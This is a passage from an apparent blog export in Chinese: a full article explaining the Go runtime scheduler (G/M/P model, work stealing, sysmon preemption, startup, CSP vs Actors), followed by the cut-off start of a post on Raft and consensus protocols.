title=\"Go调度器\"></a>Go调度器</h1><p>我们知道Go里面有成千上万coroutine需要调度执行，而这里面起关键作用的就是Go的调度器，那么Go的调度器在哪里呢？因为我们写Go代码的时候从未显式创建过调度器实例。为了了解调度器，我们先来了解下Go的运行时（Runtime)。</p>\n<h2 id=\"为什么要有Runtime\"><a href=\"#为什么要有Runtime\" class=\"headerlink\" title=\"为什么要有Runtime\"></a>为什么要有Runtime</h2><h3 id=\"开销上\"><a href=\"#开销上\" class=\"headerlink\" title=\"开销上\"></a>开销上</h3><p>我们知道操作系统是可以调度线程的，那么我们可不可以直接让操作系统调用go的线程呢。<br>POSIX线程(POSIX是线程标准，定义了创建和操纵线程的一套API)通常是在已有的进程模型中增加的逻辑扩展，所以线程控制和进程控制很相似。线程也有自己的信号掩码(signal mask)， 线程也可以设置CPU亲和性(CPU affinity)，也可以放进cgroups中进行资源管理。假如goroutines(go的执行单元)对应线程的话，使用这些特性对线程进行控制管理就增加了开销，因为go程序运行goroutines(go的执行单元)不需要这些特性。这类消耗在goroutine达到比如10,0000个的时候就会很大。所以go需要有个运行时在调度goroutines而不是只是让操作系统调度线程。</p>\n<h3 id=\"垃圾回收上\"><a href=\"#垃圾回收上\" class=\"headerlink\" title=\"垃圾回收上\"></a>垃圾回收上</h3><p>go包含垃圾回收(GC)的特性，在垃圾回收的时候所有goroutines必须处于暂停的状态，这样go的内存才会处于一种一致的状态. 所以我们必须等待所有线程处于内存一致的状态才能进行垃圾回收。</p>\n<p>在没有调度器的时候，线程调度是随操作系统的意的，你不得不试图去等待所有的已经暂停和还没暂停的线程，而且不知道等多久(如果线程进入了阻塞状态比如sleep中是无法立即响应signal的)。</p>\n<p>在有调度器的时候，调度器可以决定只在内存一致的时候才发起调度（即只要有活跃的线程就不执行新的任务），因此当需要执行gc的时候，调度器便决定只在内存一致的时候才发起调度，所以所有线程都无法再次活跃，调度器只需要等待当前活跃的线程暂停即可。后面还会讲到调度器还想办法避免一个活跃的线程长时间不停下来。</p>\n<p>需要调度器自然就需要运行调度器的运行时。</p>\n<p>基于这两个原因， golang需要一个运行时(Runtime).</p>\n<p>或者简单的讲，要想做协程线程调度就要有运行时。要想做垃圾回收就要有运行时。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"什么是Runtime\"><a href=\"#什么是Runtime\" class=\"headerlink\" title=\"什么是Runtime\"></a>什么是Runtime</h2><p>上面可以分析出Runtime所担任的职责：goroutines调度，垃圾回收，当然还提供goroutines执行的环境。</p>\n<p>所以这也相当于简要解释了什么是Runtime。</p>\n<p>go的可执行程序可以分成两个层：用户代码和运行时，运行时提供接口函数供用户代码调用，用来管理goroutines,channels和其他一些内置抽象结构。用户代码对操作系统API的任何调用都会被运行时层截取，以方便调度和垃圾回收。分层如如些：</p>\n<p><img src=\"/linkimage/goscheduler/layer.png\" alt=\"runtime layer\"></p>\n<p>图片来自 <a href=\"http://www.cs.columbia.edu/~aho/cs6998/reports/12-12-11_DeshpandeSponslerWeiss_GO.pdf\">Analysis of the Go runtime scheduler</a></p>\n<h2 id=\"初代调度器\"><a href=\"#初代调度器\" class=\"headerlink\" title=\"初代调度器\"></a>初代调度器</h2><p>Go的调度程序是Go运行时的一个更重要的方面。运行时会跟踪每个Goroutine，并将安排它们在线程池中运行。goroutines与线程分离（解耦不强绑定），但运行于线程之上。如何有效地将goroutine调度到线程上对于go程序的高性能至关重要。</p>\n<p>Goroutines的背后逻辑是：它们能够同时运行，与线程类似，但相比之下非常轻量。因此，程序运行时，Goroutines的个数应该是远大于线程的个数的。</p>\n<p>同时多线程在程序中是很有必要的，因为当goroutine调用了一个阻塞的系统调用，比如sleep，那么运行这个goroutine的线程就会被阻塞，那么这时运行时至少应该再创建一个线程来运行别的没有阻塞的goroutine。线程这里可以创建不止一个，可以按需不断地创建，而活跃的线程（处于非阻塞状态的线程）的最大个数存储在变量GOMAXPROCS中。</p>\n<p>go运行时使用3个结构来跟踪所有成员来支持调度器的工作。</p>\n<p>G:</p>\n<p>一个G代表一个goroutine，包含当前栈，当前状态和函数体。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">G</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">byte∗ stackguard; <span class=\"comment\">// stack guard information</span></span><br><span class=\"line\">byte∗ stackbase; <span class=\"comment\">// base of stack</span></span><br><span class=\"line\">byte∗ stack0; <span class=\"comment\">// current stack pointer</span></span><br><span class=\"line\">byte∗ entry; <span class=\"comment\">// initial function</span></span><br><span class=\"line\"><span class=\"keyword\">void</span>∗ param; <span class=\"comment\">// passed parameter on wakeup</span></span><br><span class=\"line\">int16 status; <span class=\"comment\">// status</span></span><br><span class=\"line\">int32 goid; <span class=\"comment\">// unique id</span></span><br><span class=\"line\">M∗ lockedm; <span class=\"comment\">// used for locking M’s and G’s</span></span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>M:</p>\n<p>一个M代表一个线程，包含全局G队列，当前G，内存等。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">M</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">G∗ curg; <span class=\"comment\">// current running goroutine</span></span><br><span class=\"line\">int32 id; <span class=\"comment\">// unique id</span></span><br><span class=\"line\">int32 locks ; <span class=\"comment\">// locks held by this M</span></span><br><span class=\"line\">MCache ∗mcache; <span class=\"comment\">// cache for this thread</span></span><br><span class=\"line\">G∗ lockedg; <span class=\"comment\">// used for locking M’s and G’s</span></span><br><span class=\"line\">uintptr createstack [<span class=\"number\">32</span>]; <span class=\"comment\">// Stack that created this thread</span></span><br><span class=\"line\">M∗ nextwaitm; <span class=\"comment\">// next M waiting for lock</span></span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>SCHED:</p>\n<p>SCHED是全局单例，用来跟踪G队列和M队列，和维护其他一些信息。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Sched</span> &#123;</span></span><br><span class=\"line\">Lock; <span class=\"comment\">// global sched lock .</span></span><br><span class=\"line\"><span class=\"comment\">// must be held to edit G or M queues</span></span><br><span class=\"line\">G ∗gfree; <span class=\"comment\">// available g’ s ( status == Gdead)</span></span><br><span class=\"line\">G ∗ghead; <span class=\"comment\">// g’ s waiting to run queue</span></span><br><span class=\"line\">G ∗gtail; <span class=\"comment\">// tail of g’ s waiting to run queue</span></span><br><span class=\"line\">int32 gwait; <span class=\"comment\">// number of g’s waiting to run</span></span><br><span class=\"line\">int32 gcount; <span class=\"comment\">// number of g’s that are alive</span></span><br><span class=\"line\">int32 grunning; <span class=\"comment\">// number of g’s running on cpu</span></span><br><span class=\"line\"><span class=\"comment\">// or in syscall</span></span><br><span class=\"line\">M ∗mhead; <span class=\"comment\">// m’s waiting for work</span></span><br><span class=\"line\">int32 mwait; <span class=\"comment\">// number of m’s waiting for work</span></span><br><span class=\"line\">int32 mcount; <span class=\"comment\">// number of m’s that have been created</span></span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>运行时刚启动时会启动一些G,其中一个负责垃圾回收，其中一个负责调度，其中一个负责用户的入口函数。一开始运行时只有一个M被创建，随后，用户层面的更多G被创建，然后更多的M被创建出来执行更多的G。同时最多同时支持GOMAXPROCS个活跃的线程。</p>\n<p>M代表一个线程，M需要从全局G队列中取出一个G并且执行G对应的代码，如果G代码执行阻塞的系统调用，那么会首先从空闲的M队列中取出一个M唤醒，随后执行阻塞调用，陷入阻塞。这么做是因为线程阻塞后，活跃的线程数肯定就小于GOMAXPROCS了，这时我们就可以增加一个活跃的线程以防止当前有G在等在M。</p>\n<p>造成阻塞的都是系统调用，在调用返回之前，线程会一直阻塞。但是注意，M不会在channel的操作中阻塞，这是因为操作系统并不知道channel，channel的所有的操作都是有运行时来处理的。所以如果goroutine执行了channel操作，这时goroutine可能会需要阻塞，但是这个阻塞不是操作系统带来的阻塞，因此M并不需要一起阻塞。这种场景下，这个G会被标记为waiting，然后原来执行这个G的M会继续去执行别的G。waiting的G在channel操作完成后会设为runable状态，并把自己放回到原来那个q的队列下，等待空闲的M来执行，不一定是先前那个M了。为了完成g的唤醒，waitting的这个g必然会在wating前先找个地方某个字段某个数组保存。</p>\n<h2 id=\"初代的问题\"><a href=\"#初代的问题\" class=\"headerlink\" title=\"初代的问题\"></a>初代的问题</h2><p>初代的调度器相对简单，所以也存在一定的问题，当然初代调度器的目的不是要马上做到成熟，只是在有限的时间内做出一个还可以的版本。</p>\n<p>Dmitry Vyukov（新调度器的作者）写的一个论文列举了老调度器存在的问题：</p>\n<p>以下来自<a href=\"https://docs.google.com/document/d/1TTj4T2JO42uD5ID9e89oa0sLKhJYD0Y_kqxDv3I3XMw/edit#heading=h.mmq8lm48qfcw\">Scalable Go Scheduler Design Doc</a></p>\n<p>第一个问题是全局锁，无论是修改M还是G的队列还是其他SCHED结构的相关字段，都需要获取这个全局锁，当遇到高吞吐高并发的程序的时候，这个设计会导致调度器的性能问题。</p>\n<p>第二个是当前有很多M之间传递G的情况，比如新建的G会被被放到全局队列，而不是在M本地执行，这导致了不必要的开销和延迟，应该优先在创建G的M上执行就可以了。</p>\n<p>第三个问题是每一个M现在都持有一个内存，包括了阻塞状态的M也是持有的。Active状态的M跟总的M个数之比可以达到1:100。这就导致了过多的内存消耗，以及较差的数据局部性。数据局部性怎么理解呢？数据局部性这里是指G当前在M运行后对M的内存进行了预热，后面如果再次调度到同一个M那么可以加速访问，可想而知，因为现在G调度到同一个M的概率不高，所以数据局部性不好。</p>\n<p>第四个是M持续的阻塞和唤醒带来的开销。比如M找不到G（目的是一有runable的G就执行），此时M就会进入频繁阻塞/唤醒来进行检查的逻辑，以便及时发现新的G来执行。</p>\n<h2 id=\"新调度器\"><a href=\"#新调度器\" class=\"headerlink\" title=\"新调度器\"></a>新调度器</h2><h3 id=\"调度器细节\"><a href=\"#调度器细节\" class=\"headerlink\" title=\"调度器细节\"></a>调度器细节</h3><p>Dmitry Vyukov的方案是引入一个结构P，用来模拟处理器，M依旧表示操作系统线程，G依旧表示一个goroutine。</p>\n<p>GOMAXPROCS用来控制P的个数，同时P作为M执行G代码时的必需资源。</p>\n<p>新的P结构会带走原来的M和SCHED结构中的一些属性，比如MCache从M移到了P，而G队列也被分成两类，SCHED结构保留全局G队列，同时每个P中都会有一个本地的G队列。</p>\n<p><img src=\"/linkimage/goscheduler/mpg.jpg\" alt=\"m-p-g\"></p>\n<p>图片来自<a href=\"https://morsmachine.dk/go-scheduler\">go-scheduler</a></p>\n<p>P的本地队列可以解决旧调度器中单一全局锁的问题。注意P的本地G队列还是可能面临一个并发访问的场景，比如下面讲到的窃取算法。为了避免加锁，这里P的本地队列是一个LockFree的队列，窃取G时使用CAS原子操作来完成。关于LockFree和CAS的知识参见<a href=\"https://yizhi.ren/2017/09/19/reorder/\">Lock-Free</a>。</p>\n<p>而P的MCache也就意味着不必为每一个M都配备一块内存，避免了过多的内存消耗。</p>\n<p>当一个新的G被创建的时候，G被放到当前M所关联的P的本地队列结尾，这样G虽然不是立即执行，但最终会得到执行。</p>\n<p>当P执行系统调用即将阻塞时，M会释放P，并进入阻塞，直到系统调用返回时，M会尝试获取空闲的P，有的话继续执行，没有就把G会放到全局G，而M会进入空闲的M队列。</p>\n<p>由于每个P都有G队列，那么当一个P的G队列执行完了的时候，另一个P却可能堆积了很多G，所以新的调度器有个G的调度算法，一般都叫做窃取算法（stealing algorithm）。</p>\n<p>当一个P执行完本地所有的G之后，会尝试随机挑选一个受害者P，从它的G队列中窃取一半的G。当尝试若干次窃取都失败之后，会从全局G队列中获取G。那么一次从全局队列取多少个呢，取 [当前个数/GOMAXPROCS]个(忽略其他一些限值检查)。所以可以看到这个全局队列使用的频率很低，虽然也是全局锁但是不至于影响性能。当然光窃取失败时获取是不够的可能会导致全局队列饥饿。P的算法中还会每个N轮调度之后就去全局队列拿一个G。那么全局队列的G又是谁放进去的呢？是在新建G时P的本地G队列放不下的时候会放半数G到全局队列去,阻塞的系统调用返回时找不到空闲P也会放到全局队列。<br>完整的过程其实比较繁琐,取g的完整顺序为: local-&gt;global-&gt;netpoll-&gt;steal-&gt;global-&gt;netpoll</p>\n<p>在窃取到的G中，有一些G是标记了它绑定的M的，遇到这类G的话，当前M就会检查这个绑定的M是否是空闲状态，如果是空闲的话（不空闲就有问题了，这个M是专门执行这个G的不会执行别的G）就会把这个M唤醒，然后把P和G交给它去执行，自己则进入阻塞状态。这部分逻辑是实现协程和线程一一绑定的关系，参见<a href=\"https://github.com/golang/go/wiki/LockOSThread\">LockOSThread</a>。</p>\n<p>同时新调度器中引入了线程自旋，自旋有好处有坏处，好处是避免线程被阻塞陷入内核，坏处是自旋属于空转，浪费CPU。只能说适度使用自旋是可以带来好处的。新方案在两个地方引入自旋：</p>\n<p><code>1，M找不到P（目的是一有P释放就结合）</code></p>\n<p><code>2，M找到了P但找不到G（目的是一有runable的G就执行）</code></p>\n<p>由于P最多只有GOMAXPROCS，所以自旋的M最多只允许GOMAXPROCS个，多了就没有意义了。同时当有类型1的自旋M存在时，类型2的自旋M就不阻塞，阻塞会释放P，一释放P就马上被类型1的自旋M抢走了，没必要。</p>\n<p>在新G被创建，M进入系统调用，M从空闲被激活这三种状态变化前，调度器会确保至少有一个自旋M存在，除非没有空闲的P。</p>\n<p>我们来分析下，当新G创建，如果有可用P，就意味着新G可以被立即执行，即便不在同一个P也无妨，所以我们保留一个自旋的M（这时应该不存在类型1的自旋只有类型2的自旋）就可以保证新G很快被运行。当M进入系统调用，意味着M不知道何时可以醒来，那么M对应的P中剩下的G就得有新的M来执行，所以我们保留一个自旋的M来执行剩下的G（这时应该不存在类型2的自旋只有类型1的自旋）。如果M从空闲变成活跃，意味着可能一个处于自旋状态的M进入工作状态了，这时要检查并确保还有一个自旋M存在，以防还有G或者还有P空着的。</p>\n<p>现在来看下面这个图应该在理解上就没有大问题了：</p>\n<p><img src=\"/linkimage/goscheduler/schedule.png\" alt=\"dance between gmp\"></p>\n<p>图片来自<a href=\"https://povilasv.me/go-scheduler/\">go-scheduler</a></p>\n<h3 id=\"问题总结\"><a href=\"#问题总结\" class=\"headerlink\" title=\"问题总结\"></a>问题总结</h3><p>到这里，老调度器中的问题已经一一被解决了。我们来一一回顾下：</p>\n<h4 id=\"全局锁的问题\"><a href=\"#全局锁的问题\" class=\"headerlink\" title=\"全局锁的问题\"></a>全局锁的问题</h4><p>G被分成全局G队列和P的本地G队列，全局G队列依旧是全局锁，但是使用场景明显很少，P本地队列使用无锁队列，使用原子操作来面对可能的并发场景。</p>\n<h4 id=\"G传递带来开销的问题\"><a href=\"#G传递带来开销的问题\" class=\"headerlink\" title=\"G传递带来开销的问题\"></a>G传递带来开销的问题</h4><p>G创建时就在P的本地队列，可以避免在G之间传递（窃取除外）; 当G开始执行了，系统调用返回后M会尝试获取可用P，获取到了的话可以避免在M之间传递。</p>\n<h4 id=\"内存消耗问题\"><a href=\"#内存消耗问题\" class=\"headerlink\" title=\"内存消耗问题\"></a>内存消耗问题</h4><p>内存MCache只存在P结构中，P最多只有GOMAXPROCS个，远小于M的个数，所以内存没有过多的消耗。</p>\n<h4 id=\"数据局部性问题\"><a href=\"#数据局部性问题\" class=\"headerlink\" title=\"数据局部性问题\"></a>数据局部性问题</h4><p>新建的G放在本地队列，所以G对P的数据局部性好；系统调用后尝试获取可用P并执行，而且优先获取调用阻塞前的P，所以G对M数据局部性好，G对P的数据局部性也好；由于总的内存数目最多只有GOMAXPROCS而不是M的个数了，因此G调度到拥有同一块内存的执行单元的概率也就变大了，数据局部性也就变好了。</p>\n<p>数据局部性还可以更好的，比如M选择空闲P时可以优先选择上一次绑定过的P。</p>\n<h4 id=\"频繁阻塞和唤醒\"><a href=\"#频繁阻塞和唤醒\" class=\"headerlink\" title=\"频繁阻塞和唤醒\"></a>频繁阻塞和唤醒</h4><p>通过引入自旋，保证任何时候都有处于等待状态的自旋M，避免在等待可用的P和G时频繁的阻塞和唤醒。</p>\n<h2 id=\"Go程序的启动过程\"><a href=\"#Go程序的启动过程\" class=\"headerlink\" title=\"Go程序的启动过程\"></a>Go程序的启动过程</h2><p>整个程序始于一段汇编:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// _rt0_amd64 is common startup code for most amd64 systems when using</span><br><span class=\"line\">// internal linking. This is the entry point for the program from the</span><br><span class=\"line\">// kernel for an ordinary -buildmode=exe program. The stack holds the</span><br><span class=\"line\">// number of arguments and the C-style argv.</span><br><span class=\"line\">TEXT _rt0_amd64(SB),NOSPLIT,$-8</span><br><span class=\"line\">\tMOVQ\t0(SP), DI\t// argc</span><br><span class=\"line\">\tLEAQ\t8(SP), SI\t// argv</span><br><span class=\"line\">\tJMP\truntime·rt0_go(SB)</span><br></pre></td></tr></table></figure>\n\n<p>而在随后的runtime·rt0_go（也是汇编程序）中，go一共做了这么几件事：</p>\n<p><code>绑定m0和g0</code></p>\n<p>m0和g0是什么呢，m0就是程序的主线程，程序启动必然会拥有一个主线程，这个就是m0.</p>\n<p>每一个m结构中会包含两个主要的g：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> m <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tg0      *g     <span class=\"comment\">// goroutine with scheduling stack</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tcurg          *g       <span class=\"comment\">// current running goroutine</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到m中的g0负责调度，curg是具体的任务g。因此这里的g0也就是m0的g0。而m0的curg现在还是空的。</p>\n<p><code>创建p，绑定m0和p0</code></p>\n<p>这里并不是去初始化g0，而是创建出了所需的p，p的数目优先取环境变量GOMAXPROCS,否则默认是cpu核数。随后把第一个p（便于理解可以叫它p0）与m0进行绑定，这样m0就有他自己的p了，就有条件执行后续的任务g了。</p>\n<p><code>新建任务g到p0本地队列</code></p>\n<p>这里m0的g0会执行调度任务（runtime.newproc)，创建一个g，g指向runtime.main()(还不是我们main包中的main）,并放到p的本地队列。这样m0就已经同时具有了任务g和p，什么条件都具备了。</p>\n<p><code>执行统一的调度任务</code></p>\n<p>调度器实现中有个同一个调度器入口，叫mstart(),这个实现中会去获取一个空闲的p（如果没有），然后执行schedule(), schedule中就会去不停的寻找可用的g来执行。这里其实初始工作已经全部完成并且把调度器启动起来了。后面可以不用管了，可以自动跑起来了。</p>\n<p><code>持续调度</code></p>\n<p>由于前一个步骤已经在p0中插入了一个指向runtime.main的g，所以显然之后第一个跑起来的任务g就是runtime.main。</p>\n<p>runtime.main的工作包括：启动sysmon线程（这个线程游离在调度器之外，不受调度器管理，下面再讲）；启动gc协程；执行init，这个就是统一执行我们代码中书写的各种init函数；执行main函数，这个就是我们main包中的main，可以看到，到这里我们的函数入口才终于被执行到了。</p>\n<p>再后面就是前面讲过的GMP模型的工作过程了，main会创建g，g被放入p，并且触发m的创建，如此循环往复。</p>\n<h2 id=\"Sysmon线程\"><a href=\"#Sysmon线程\" class=\"headerlink\" title=\"Sysmon线程\"></a>Sysmon线程</h2><p>我们前面遗留了一些没有解释的工作流程，一个是调度器如何抢占长时间不返回的g，一个是sysmon是做什么的.这里可以一起解释了。因为调度器就是通过sysmon来进行抢占的。</p>\n<p>sysmon也叫监控线程，它无需P也可以运行，他是一个死循环，每20us~10ms循环一次，循环完一次就sleep一会，为什么会是一个变动的周期呢，主要是避免空转，如果每次循环都没什么需要做的事，那么sleep的时间就会加大。</p>\n<p>sysmon主要做下面几个事:</p>\n<ol>\n<li><p>释放闲置超过5分钟的span物理内存；</p>\n</li>\n<li><p>如果超过2分钟没有垃圾回收，强制执行；</p>\n</li>\n<li><p>将长时间未处理的netpoll结果添加到全局G队列；</p>\n</li>\n<li><p>向长时间运行的G任务发出抢占调度；</p>\n</li>\n<li><p>收回因syscall长时间阻塞的P；</p>\n</li>\n</ol>\n<p>那么抢占就是发生在第4点。</p>\n<p>当sysmon发现一个p一直处于running状态超过了10ms，那么就给这个g设置一个标志位，随后等到这个g调用新函数的时候，会检查到这个标志位，并且重新进行调度，不让这个g继续执行。</p>\n<p>不过并不是设置了标志位就一定会被调度，这里有两个条件，一个是g必须调用函数，否则如果是一个简单的死循环是无法抢占成功的；另一个条件是即使调用了新函数，如果新函数所需的栈空间很少，那么也不会触发检查这个标志位，只有调用了会触发栈空间检查（所需栈大于128字节，详见<a href=\"https://www.zhihu.com/question/308020301/answer/587239642\">知乎回答</a>）的函数，才会抢占成功。</p>\n<p>第5点是什么意思呢，我们知道g中调用系统调用后会解绑p，然后m和g进入阻塞，而p此时的状态就是syscall，表明这个p的g正在syscall中，这时的p是不能被调度给别的m的。如果在短时间内阻塞的m就唤醒了，那么m会优先来重新获取这个p，能获取到就继续绑回去，这样有利于数据的局部性。</p>\n<p>但是当m较长时间没有唤醒的话，p继续等的成本就有点大了，这个时候sysmon就会吧他设为idle，重新调度给需要的M。这个时间界限是10ms，超过10ms就会被sysmon回收用于调度。</p>\n<h2 id=\"go的协程模型\"><a href=\"#go的协程模型\" class=\"headerlink\" title=\"go的协程模型\"></a>go的协程模型</h2><p>这部分跟调度器关系不大，主要是补充一个知识点。</p>\n<p>golang的goroutines是基于CSP(Communicating Sequential Processes)理论模型来设计的。</p>\n<p>CSP主要是指两个独立的Process，通过共享Channel来交互。并发模型除了CSP另外还有Actors模型。</p>\n<h3 id=\"CSP和Actors简介\"><a href=\"#CSP和Actors简介\" class=\"headerlink\" title=\"CSP和Actors简介\"></a>CSP和Actors简介</h3><p>CSP模型就是coroutine+channel的模式。</p>\n<p>coroutine之间通信是通过channel实现的，coroutine之间可以共享channel。</p>\n<p>比如golang就是基于CSP实现的。</p>\n<p>Actors模型就是coroutine+message的模式。</p>\n<p>coroutine之间通信是通过message实现的，message是明确的发送给某个coroutine的。</p>\n<p>比如erlang就是基于Actors实现的。</p>\n<h3 id=\"CSP和Actors的区别\"><a href=\"#CSP和Actors的区别\" class=\"headerlink\" title=\"CSP和Actors的区别\"></a>CSP和Actors的区别</h3><h4 id=\"同步异步\"><a href=\"#同步异步\" class=\"headerlink\" title=\"同步异步\"></a>同步异步</h4><p>CSP的通信机制通常是同步的，任务被推进channel后立即被对端收到并执行，如果对端正忙，则发送者就阻塞无法推送该任务，golang对channel进行了修改，支持缓存任务，可以缓存多个任务等待执行，避免发送者阻塞。</p>\n<p>Actors的通信机制通常是异步的，消息发送时发送者不会阻塞，接收者也不一定马上收到，收到也不一定马上执行。erlang中的actor角色非常广泛，可以是同个runtime下的，也可以是runtime间的，甚至可以是机器间的。</p>\n<h4 id=\"匿名性\"><a href=\"#匿名性\" class=\"headerlink\" title=\"匿名性\"></a>匿名性</h4><p>CSP中的channel通常是匿名的，任务放进channel后你并不知道对端是谁在接收。</p>\n<p>Actors中的message通常有确定目标，你需要确切的知道对方的地址(ID/NAME/PORT等)才能将信息发送出去。</p>\n<h3 id=\"耦合性\"><a href=\"#耦合性\" class=\"headerlink\" title=\"耦合性\"></a>耦合性</h3><p>CSP中channel是共享的，可以多个生产者可多个消费者公用，生产者消费者之间不强关联。</p>\n<p>Actors中你必须知道对方的地址(ID/NAME/PORT等)，这导致生产者和消费者之间发生耦合，对方actor是不可替换的。</p>\n<h3 id=\"容错\"><a href=\"#容错\" class=\"headerlink\" title=\"容错\"></a>容错</h3><p>CSP没有定义容错方面的内容，所以开发者需要自己处理channel接收和发送的错误，这些错误处理逻辑可能会到处都是。</p>\n<p>Actors支持容错，你可以定义错误的类型，错误处理方式，错误的级别等。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"https://morsmachine.dk/go-scheduler\">go-scheduler</a></p>\n<p><a href=\"http://www.cs.columbia.edu/~aho/cs6998/reports/12-12-11_DeshpandeSponslerWeiss_GO.pdf\">Analysis of the Go runtime scheduler</a></p>\n<p><a href=\"https://docs.google.com/document/d/1TTj4T2JO42uD5ID9e89oa0sLKhJYD0Y_kqxDv3I3XMw/edit#heading=h.mmq8lm48qfcw\">Scalable Go Scheduler Design Doc</a></p>\n<p><a href=\"https://www.cntofu.com/book/3/zh/05.2.md\">goroutine的生老病死</a></p>\n<p><a href=\"http://www.importnew.com/24226.html\">Actors模型和CSP模型</a></p>\n<p><a href=\"https://doc.yonyoucloud.com/doc/akka-doc-cn/2.3.6/scala/book/chapter3/03_fault_tolerance.html\">AKKA容错</a></p>\n<p><a href=\"https://stackoverflow.com/questions/22621514/is-scalas-actors-similar-to-gos-coroutines\">is Scala’s actors similar to go’s coroutine?</a></p>\n","categories":["代码"],"tags":["狗狼"]},{"title":"raft 协议解析","url":"/2020/12/19/raft/","content":"<h1 id=\"raft-协议解析\"><a href=\"#raft-协议解析\" class=\"headerlink\" title=\"raft 协议解析\"></a>raft 协议解析</h1><h2 id=\"高可用的实现方案总结\"><a href=\"#高可用的实现方案总结\" class=\"headerlink\" title=\"高可用的实现方案总结\"></a>高可用的实现方案总结</h2><p>在工程实践中，高可用的方案有很多，例举几个，大家一定知道大部分的名词：主备，双备，HAProxy, F5, VRRP，Sentinel， gossip， paxos等。</p>\n<p>这一系列的技术方案，可以简化和归纳成两类：一类可以叫哨兵， 如图以haproxy为例：</p>\n<p><img src=\"/linkimage/raft/haproxy.png\" alt=\"haproxy\"></p>\n<p>图片来自 <a href=\"https://www.haproxy.com/fr/blog/using-haproxy-with-the-proxy-protocol-to-better-secure-your-database/\">Using HAProxy with the Proxy Protocol to Better Secure Your Database</a></p>\n<p>这一类方案，有个共同点，都有一个类似哨兵的角色，细化的讲，有的叫proxy，有的叫gateway，有的叫monitor，有的叫sentinel，有的叫router，他们的作用都是类似的，就是感知并屏蔽内部不健康的主机，并对外提供一个始终可用的服务。完成高可用的目的。</p>\n<p>另一类技术方案，可以叫一致性协议，如图基于gossip的redis cluster为例：</p>\n<p><img src=\"/linkimage/raft/rediscluster.jpg\" alt=\"rediscluster\"></p>\n<p>图片来自 <a href=\"https://yizhi.ren/2019/06/25/microservice/\">微服务</a> </p>\n<p>这一类方案，也有一个共同点，就是都实现了一种内部节点之间的通信协议，协议能够发现异常节点，并且在内部通过某种机制来容错，不需要依赖外部的角色。 一致性协议的实现高可用的机制，最重要的一点就是半数同意的机制，因此能容忍半数-1的节点宕机。</p>\n<span id=\"more\"></span>\n\n<p>有的人说哨兵类的都是无状态的服务，一致性协议的都是有状态的服务，并不是这样。有状态的服务一样可以用哨兵类的方案, 比如一致性hash的方案就是有状态的.</p>\n<p><img src=\"/linkimage/raft/consistent_hash_proxy.png\" alt=\"consistent_hash_proxy\"></p>\n<p>图片基于 <a href=\"https://www.jianshu.com/p/528ce5cd7e8f\">一致性Hash原理与实现</a></p>\n<p>这偏文章重点关注一致性协议，下面简单列举常见的一致性协议。</p>\n<h2 id=\"一致性协议\"><a href=\"#一致性协议\" class=\"headerlink\" title=\"一致性协议\"></a>一致性协议</h2><h3 id=\"gossip\"><a href=\"#gossip\" class=\"headerlink\" title=\"gossip\"></a>gossip</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自： https://www.jianshu.com/p/8279d6fd65bb</span><br><span class=\"line\">Gossip 过程是由种子节点发起，当一个种子节点有状态需要更新到网络中的其他节点时，它会随机的选择周围几个节点散播消息，收到消息的节点也会重复该过程，直至最终网络中所有的节点都收到了消息。这个过程可能需要一定的时间，因为不能保证某个时刻所有节点都收到消息，但是理论上最终所有节点都会收到消息，因此它是一个最终一致性协议。</span><br></pre></td></tr></table></figure>\n<p><img src=\"/linkimage/raft/gossip.gif\" alt=\"gossip\"></p>\n<p>图片来自 <a href=\"https://zhuanlan.zhihu.com/p/41228196\">P2P 网络核心技术：Gossip 协议</a></p>\n<p>如redis cluster内部使用gossip进行通信，他借助gossip实现高可用的方案如下：<br>当A节点检测不到B的时候，A会把B的不可用状态通过gossip协议进行传播，此时B只是在A看来主观下线，当半数以上节点都认为B不可用时就认为B真的不可用了，此时B处于客观下线状态，下线状态通过消息继续传播，那么所有节点都会认为B已经不可用。之后B的备节点就会参与选举，经过半数同意后选举成功，新节点接替B节点继续工作。</p>\n<h3 id=\"paxos\"><a href=\"#paxos\" class=\"headerlink\" title=\"paxos\"></a>paxos</h3><p>paxos协议提交一项决议需要经过两个阶段，他每经过一个两阶段提交过程，就会在集群中达成一个条目，或者说达成一个一致的意见。多个这样的过程就可以达成多个结果。<br>整个过程包含prepare和accept两个阶段。</p>\n<blockquote>\n<p> prepare过程是A节点广播某个提案即发送prepare请求，如果其他节点接受了就回复promise，否则回复error；<br>这时候A会整理这些回复，如果回复的promise超过一半，那么prepare过程就成功了，可以继续下一个过程。</p>\n</blockquote>\n<blockquote>\n<p>接着他就给这些回复promise的节点广播一个propose消息，如果节点接受，就回复accept，否则回复error；<br>这时候A就再次整理这些回复的accept，如果超过一半就完成了这个协商的过程，A就会把这个结果告诉给所有关注这个结果的人(learner)。</p>\n</blockquote>\n<p><img src=\"/linkimage/raft/paxos_stage.png\" alt=\"paxos_stage\"></p>\n<p>图片来自 <a href=\"https://www.cnblogs.com/Chary/p/13950387.html\">一致性算法 